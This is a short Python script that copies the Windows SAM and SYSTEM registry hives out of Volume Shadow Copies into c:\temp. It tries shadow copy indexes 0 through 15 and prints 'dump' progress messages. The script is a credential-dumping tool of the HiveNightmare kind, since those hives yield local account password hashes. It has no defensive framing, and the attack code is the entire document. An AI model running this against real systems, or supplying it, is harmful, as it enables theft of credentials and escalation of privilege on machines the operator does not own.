import shutil
import os

def make_copy(config_file):
    file = f"c:\\temp\\{config_file}.copy"
    print(f"[*] Trying to dump {config_file}...")
    for i in range(16):
        try:
            backup_location = f'\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{i}\\Windows\\System32\\config\\{config_file}'
            shutil.copy(backup_location, file)
            print(f"[*] Backup located at {backup_location}")
            print(f"[*] Successfully copied {config_file} to {file}")
            return file
        except:
            pass
    print(f"[!] Dump of {config_file} failed, ")

def main():
    make_copy("system")
    make_copy("sam")
if __name__ == '__main__':
    main()
